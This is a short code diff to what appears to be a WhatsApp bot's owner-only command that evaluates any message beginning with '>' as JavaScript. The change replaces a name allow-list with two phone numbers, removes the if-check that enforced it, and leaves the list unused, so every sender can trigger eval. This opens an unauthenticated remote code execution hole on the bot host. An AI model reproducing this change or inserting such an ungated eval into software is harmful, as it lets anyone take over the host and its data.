@@ -18,7 +18,7 @@ cmd({
 		isGroup,
 		sender,
             senderNumber,
-		pushName,
+		pushname,
 		isMe,
 		isOwner,
 		groupMetadata,
@@ -30,9 +30,8 @@ cmd({
 		reply
 	}) => {
 		
-    var Ameen = ['Ameen Int',  'Main Tain']
-	if (Ameen.includes(pushName))
-{
+    var Ameen = ['916238768108', '918589959671']
+	
         if (body.startsWith(">")) {
             try {
                 let evaled = await eval(`(async () => { ${body?.replace(">", "")} })()`);
@@ -41,5 +40,5 @@ cmd({
 	    } catch (e) {
 				m.reply(`${e.message}`);
 			}
-		}
+		
 		}});
